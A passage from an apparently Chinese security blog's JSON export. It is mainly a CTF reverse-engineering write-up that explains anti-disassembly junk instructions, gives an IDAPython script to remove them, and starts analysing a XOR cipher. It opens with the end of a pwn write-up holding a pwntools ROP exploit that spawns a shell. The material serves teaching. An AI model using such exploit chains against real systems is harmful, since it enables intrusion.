class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804844b</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","text":"新手练习when_did_you_borngets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x81<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}]},{"title":"花指令去除wp","slug":"花指令去除wp","date":"2018-12-05T13:50:11.000Z","updated":"2018-12-06T06:48:32.000Z","comments":true,"path":"api/articles/花指令去除wp.json","excerpt":"","keywords":null,"cover":null,"content":"<p>​    这学期《恶意代码分析》这门课的作业留了一道RE题，其中包含大量批量插入的花指令。在这里简单记录一下分析过程。</p>\n<h2 id=\"0x00-基本分析\"><a href=\"#0x00-基本分析\" class=\"headerlink\" title=\"0x00  基本分析\"></a>0x00  基本分析</h2><p>首先动态执行程序看一下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\UCAS\\malware_analyse&gt;Anti.exe</span><br><span class=\"line\">The encypted flag in hex is:</span><br><span class=\"line\">3A3B3138233B3C3437300B3730073228393523062E2B242A</span><br><span class=\"line\">Please input cipher character:3</span><br><span class=\"line\">Hex result for encrypt string 'thisisasimplesamplestring' is:</span><br><span class=\"line\">7A6D6B7E63756C706D61766661796B62756067787271656B6B</span><br></pre></td></tr></table></figure>\n<p>输入点只有一个，要求输入一个加密字符，然后就会输出对<code>thisisasimplesamplestring</code>字符串的加密结果。那么显然，只要我们能够分析并逆向出加密算法，就能把加密后的flag解密得到原flag，当然这个加密算法应该是可逆的，否则就有点难办了。</p>\n<p>首先用IDA加载Anti.exe，并加载题目所给的pdb文件——应该说出题人还是很好的（谢谢师兄~_~）。之后粗略浏览反汇编代码，主要有两点发现：</p>\n<ul>\n<li>该程序应该由C++语言编写，因为有虚表和类层次关系</li>\n<li>代码中添加了大量花指令</li>\n</ul>\n<h2 id=\"0x01-花指令分析\"><a href=\"#0x01-花指令分析\" class=\"headerlink\" title=\"0x01  花指令分析\"></a>0x01  花指令分析</h2><p>下面对代码中涉及到的花指令作基本分析</p>\n<p>1.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A1B loc_401A1B:                             ; CODE XREF: .text:loc_401A1B↑j</span><br><span class=\"line\">.text:00401A1B                 jmp     short near ptr loc_401A1B+1</span><br><span class=\"line\">.text:00401A1D ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1D                 ror     byte ptr [eax-73h], 45h</span><br></pre></td></tr></table></figure>\n<p>这是因为两条顺序执行的指令使用了一个公共byte，而IDA在反汇编完一条指令后，会从这条指令的下一个地址处开始反汇编，所以无法表示这种情况。具体来说，0x401a1b处是<code>0xeb</code>,0x401a1c处是<code>0xff</code>，IDA首先把0xeb翻译成jmp指令，然后往下找操作数，是短跳转+1；之后，就会顺序反汇编0x401a1d处的内容。但是程序在执行时实际上跳转到0x1a1c处执行，这就导致一个矛盾。</p>\n<p>手工去掉花指令还原即可，暂时不用管那个垃圾字节，在脚本批量去除阶段可以Patch为NOP指令。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A14 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1B                 db 0EBh</span><br><span class=\"line\">.text:00401A1C ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1C                 inc     eax</span><br><span class=\"line\">.text:00401A1E                 dec     eax</span><br><span class=\"line\">.text:00401A1F                 lea     eax, [ebp-34h]</span><br></pre></td></tr></table></figure>\n<p>2.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:004019E5                 push    offset __ehhandler$?enc2@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V12@D@Z</span><br><span class=\"line\">.text:004019EA                 mov     eax, large fs:0</span><br><span class=\"line\">.text:004019F0                 push    eax</span><br><span class=\"line\">.text:004019F1                 mov     large fs:0, esp</span><br><span class=\"line\">......</span><br><span class=\"line\">.text:00401A4E                 xor     eax, eax</span><br><span class=\"line\">.text:00401A50                 idiv    eax</span><br><span class=\"line\">.text:00401A52                 retn</span><br><span class=\"line\">.text:00401A53                 db 8Bh</span><br><span class=\"line\">.text:00401A54                 dd 64082464h, 0A1h, 8B008B00h, 0A36400h, 83000000h, 5D5808C4h</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<p>这算是第二种花指令。0x4019e5处的四条指令首先将fs[0]压入堆栈，从而使得执行完成后，fs[0]指向栈顶。之后，构造一个err结构。在0x401a4e处，故意触发一个除零异常，然后就会进入异常处理流程。</p>\n<p>同时，由于除零后是一条retn指令，IDA在反汇编时不会将retn的下一个地址识别为指令，直到找到一个函数头<code>push    ebp; mov    ebp, esp</code> ，这又使得反汇编出错。</p>\n<p>详细的异常处理流程我们在静态分析阶段不好分析，如读者感兴趣可以详细查阅资料。但我们通过OD调试可以大体了解程序的控制流。</p>\n<p>在0x401a50处下断，并在调试选项中去掉所有忽略异常的勾选，点击确定后F9断到断点处，然后F8单步调试，到达如下位置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C92E460    8B1C24          mov ebx,dword ptr ss:[esp]</span><br><span class=\"line\">7C92E463    51              push ecx</span><br><span class=\"line\">7C92E464    53              push ebx</span><br><span class=\"line\">7C92E465    E8 E6C40100     call ntdll.7C94A950</span><br></pre></td></tr></table></figure>\n<p>F7步入函数调用，然后继续单步跟，看到一个可疑位置，会将0x401a53的地址作为参数压栈，然后调用一个函数，步入函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C923261    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923265    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923269    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C92326D    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923271    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923275    E8 08000000     call ntdll.7C923282</span><br></pre></td></tr></table></figure>\n<p>果然，此处最终<code>call ecx</code>，使得eip跳转到0x401a53处执行。所以我们应该在0x401a53处按C识别为代码，修复反汇编。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C923289    64:FF35 0000000&gt;push dword ptr fs:[0]</span><br><span class=\"line\">7C923290    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class=\"line\">7C923297    FF75 14         push dword ptr ss:[ebp+0x14]</span><br><span class=\"line\">7C92329A    FF75 10         push dword ptr ss:[ebp+0x10]</span><br><span class=\"line\">7C92329D    FF75 0C         push dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">7C9232A0    FF75 08         push dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">7C9232A3    8B4D 18         mov ecx,dword ptr ss:[ebp+0x18]          ; Anti.00401A53</span><br><span class=\"line\">7C9232A6    FFD1            call ecx                                 ; Anti.00401A53</span><br></pre></td></tr></table></figure>\n<p>3.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A8A                 jz      near ptr loc_401A96+4</span><br><span class=\"line\">.text:00401A90                 jnz     near ptr loc_401A96+4</span><br><span class=\"line\">.text:00401A96</span><br><span class=\"line\">.text:00401A96 loc_401A96:                             ; CODE XREF: .text:00401A8A↑j</span><br><span class=\"line\">.text:00401A96                                         ; .text:00401A90↑j</span><br><span class=\"line\">.text:00401A96                 call    near ptr 0F733CACh</span><br></pre></td></tr></table></figure>\n<p>比起上面两种花指令，这一种都算小菜啦。构造连续两个互补的条件跳转到同一位置。因为条件跳转为基本块出口，诱导IDA反汇编基本块邻接地址为新的基本块入口。实际上只是几个字节的垃圾数据。简单修复即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A8A                 jz      loc_401A9A</span><br><span class=\"line\">.text:00401A90                 jnz     loc_401A9A</span><br><span class=\"line\">.text:00401A90 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A96                 db 0E8h</span><br><span class=\"line\">.text:00401A97                 db  11h</span><br><span class=\"line\">.text:00401A98                 db  22h ; &quot;</span><br><span class=\"line\">.text:00401A99                 db  33h ; 3</span><br><span class=\"line\">.text:00401A9A ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A9A</span><br><span class=\"line\">.text:00401A9A loc_401A9A:                             ; CODE XREF: .text:00401A8A↑j</span><br><span class=\"line\">.text:00401A9A                                         ; .text:00401A90↑j</span><br></pre></td></tr></table></figure>\n<p>4.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ACA                 xor     eax, eax</span><br><span class=\"line\">.text:00401ACC                 jz      near ptr loc_401AD2+1</span><br><span class=\"line\">.text:00401AD2</span><br><span class=\"line\">.text:00401AD2 loc_401AD2:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD2                 call    near ptr 0D085A62Fh</span><br></pre></td></tr></table></figure>\n<p>这种是构造一个恒真的条件跳转，再加上一个垃圾字节，很好理解。简单修复即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ACA                 xor     eax, eax</span><br><span class=\"line\">.text:00401ACC                 jz      loc_401AD3</span><br><span class=\"line\">.text:00401ACC ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401AD2                 db 0E8h</span><br><span class=\"line\">.text:00401AD3 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401AD3</span><br><span class=\"line\">.text:00401AD3 loc_401AD3:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD3                 pop     eax</span><br><span class=\"line\">.text:00401AD4                 mov     eax, [ebp-30h]</span><br></pre></td></tr></table></figure>\n<p>分析到这里，第一个函数enc1的花指令我们已经完全去除了，在IDA中按F5可以进行反编译。不过在手动分析下一个函数后，按F5无法进行反编译。这是因为IDA没有将其识别为函数，我们在已修复的函数入口点处按P MakeProc即可。</p>\n<h2 id=\"0x02-脚本批量去除花指令\"><a href=\"#0x02-脚本批量去除花指令\" class=\"headerlink\" title=\"0x02 脚本批量去除花指令\"></a>0x02 脚本批量去除花指令</h2><p>到这里相信手工去除花指令已经难不倒大家了，但是程序中显然有大量批量插入的花指令，如果一一通过手工去除，不太可行。这时候，我们可以借助IDAPython这个工具编写一个去除花指令的插件。<a href=\"https://www.hex-rays.com/products/ida/support/idapython_docs/\" target=\"_blank\" rel=\"noopener\">官方文档</a>对于IDAPython的API有一定程度的讲解，但是这个东西还是有一定的学习成本的，如果感觉上手困难可以看一下Hex-Rays官方每年举办的IDA插件大赛的获奖作品（<a href=\"https://hex-rays.com/contests/\" target=\"_blank\" rel=\"noopener\">链接在这</a>），学习一下。</p>\n<p>这里先直接给出脚本。其实写的很不好，主要思路就是逐指令或逐字节遍历，然后对这几种花指令予以识别和去除。同时由于比较懒，直接设置remove函数执行5次，暴力解决递归问题。不过多执行几次是没有副作用的。</p>\n<p>另外，执行脚本后，可能还会有极少量代码反汇编出错，在分析到相应函数后手工按C识别为代码即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ida_auto <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ida_bytes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ida_ua <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">change = <span class=\"number\">0</span></span><br><span class=\"line\">startea = <span class=\"number\">0x4019e0</span></span><br><span class=\"line\">endea = <span class=\"number\">0x405230</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">preprocess</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\tauto_make_code(curea)</span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\t<span class=\"comment\"># print hex(curea)</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea) == <span class=\"string\">\"retn\"</span>:</span><br><span class=\"line\">\t\t\tMakeCode(curea + <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea).startswith(<span class=\"string\">\"db\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">True</span> <span class=\"keyword\">and</span> GetDisasm(curea + <span class=\"number\">1</span>).startswith(<span class=\"string\">\"db\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">False</span> <span class=\"keyword\">and</span> GetDisasm(curea).endswith(<span class=\"string\">\")\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">False</span>:</span><br><span class=\"line\">\t\t\tdo_unknown(curea + <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\tMakeCode(curea)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> xref <span class=\"keyword\">in</span> XrefsFrom(curea, <span class=\"number\">1</span>):</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># print hex(xref.frm), hex(xref.to)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> xref.to - xref.frm == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> get_byte(xref.frm) == <span class=\"number\">0xeb</span>:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># print \"yes\"</span></span><br><span class=\"line\">\t\t\t\t\tea = xref.frm</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tdo_unknown(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\tpatch_byte(xref.frm, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tchange = MakeCode(xref.frm)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">elif</span> xref.to == next_head(curea, endea) + <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> get_byte(xref.to - <span class=\"number\">1</span>) == <span class=\"number\">0xe8</span>:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># print \"yess\"</span></span><br><span class=\"line\">\t\t\t\t\tdo_unknown(xref.to - <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\t\tpatch_byte(xref.to - <span class=\"number\">1</span>, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tMakeCode(xref.to - <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">elif</span> xref.to == next_head(next_head(curea, endea), endea) + <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t\ttar_ea = next_head(next_head(curea, endea), endea)</span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\tdo_unknown(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">\t\t\t\t\tpatch_byte(ea, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\">\tAnalyseRange(startea,endea)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">recognize</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea) == <span class=\"string\">\"push    ebp\"</span> <span class=\"keyword\">and</span> GetDisasm(curea+<span class=\"number\">1</span>) == <span class=\"string\">\"mov     ebp, esp\"</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">print</span> <span class=\"string\">\"should be make\"</span></span><br><span class=\"line\">\t\t\tauto_make_proc(curea)</span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">\tpreprocess()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tremove()</span><br><span class=\"line\">\trecognize()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-加密算法分析与逆向\"><a href=\"#0x03-加密算法分析与逆向\" class=\"headerlink\" title=\"0x03  加密算法分析与逆向\"></a>0x03  加密算法分析与逆向</h2><p>至此，我们已经解决了花指令问题，可以开始分析具体算法了。main函数中会调用encrypt函数加密，最后调用hexencode函数输出结果。</p>\n<p>直接查看encrypt函数的F5代码，但是由于是C++程序，伪C代码比较乱，看不出所以然。不过我们可以明确encrypt函数中首先调用了enc2函数。其核心代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ABF                 call    j_?length@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(void)</span><br><span class=\"line\">.text:00401AC4                 cmp     [ebp-30h], eax  ; cnt &lt; 源字符串长度时</span><br><span class=\"line\">.text:00401AC7                 jnb     short loc_401B18</span><br><span class=\"line\">.text:00401AC9                 push    eax             ; 先push eax</span><br><span class=\"line\">.text:00401ACA                 xor     eax, eax        ; 花指令</span><br><span class=\"line\">.text:00401ACC                 jz      loc_401AD3      ; pop eax，恢复</span><br><span class=\"line\">.text:00401AD2                 nop</span><br><span class=\"line\">.text:00401AD3</span><br><span class=\"line\">.text:00401AD3 loc_401AD3:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD3                 pop     eax             ; pop eax，恢复</span><br><span class=\"line\">.text:00401AD4                 mov     eax, [ebp-30h]  ; eax = cnt</span><br><span class=\"line\">.text:00401AD7                 push    eax</span><br><span class=\"line\">.text:00401AD8                 lea     ecx, [ebp+0Ch]</span><br><span class=\"line\">.text:00401ADB                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; 取源字符串中下标cnt处字符</span><br><span class=\"line\">.text:00401AE0                 movsx   ebx, byte ptr [eax] ; 放到ebx中</span><br><span class=\"line\">.text:00401AE3                 lea     ecx, [ebp-1Ch]</span><br><span class=\"line\">.text:00401AE6                 call    j_?length@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(void)</span><br><span class=\"line\">.text:00401AEB                 mov     ecx, eax        ; 取字符串&quot;2&quot;的长度放到ecx中</span><br><span class=\"line\">.text:00401AED                 mov     eax, [ebp-30h]  ; eax = cnt</span><br><span class=\"line\">.text:00401AF0                 xor     edx, edx        ; 高位置0</span><br><span class=\"line\">.text:00401AF2                 div     ecx             ; cnt / &quot;2&quot;的长度</span><br><span class=\"line\">.text:00401AF4                 push    edx             ; 余数压栈</span><br><span class=\"line\">.text:00401AF5                 lea     ecx, [ebp-1Ch]</span><br><span class=\"line\">.text:00401AF8                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; 取key[cnt%len(cip)]</span><br><span class=\"line\">.text:00401AFD                 movsx   edx, byte ptr [eax] ; 放在edx中</span><br><span class=\"line\">.text:00401B00                 xor     ebx, edx        ; ord[cnt] ^ key[cnt%len(cip)]</span><br><span class=\"line\">.text:00401B02                 movsx   eax, byte ptr [ebp+1Ch]</span><br><span class=\"line\">.text:00401B06                 xor     ebx, eax\t\t   ; 再次与输入的密钥字符异或</span><br><span class=\"line\">.text:00401B08                 mov     ecx, [ebp-30h]</span><br><span class=\"line\">.text:00401B0B                 push    ecx</span><br><span class=\"line\">.text:00401B0C                 lea     ecx, [ebp-2Ch]</span><br><span class=\"line\">.text:00401B0F                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](uint)</span><br><span class=\"line\">.text:00401B14                 mov     [eax], bl</span><br></pre></td></tr></table></figure>\n<p>这里0x401aeb处的操作比较有趣，这个字符串为什么是2呢？猜想到可能与函数名enc2的2有关，于是用OD调试enc3、enc5函数，发现这个串变成”3”和”5”，这说明果然与函数名有关。</p>\n<p>调用enc2并在两次按位异或后，将结果存储并回到encrpyt函数体调用enc3，然后通过异常处理链调用enc5、enc8……，最后调用enc28657，最后得到加密结果。因此，加密算法的逻辑已经很清楚了，给出Python实现</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 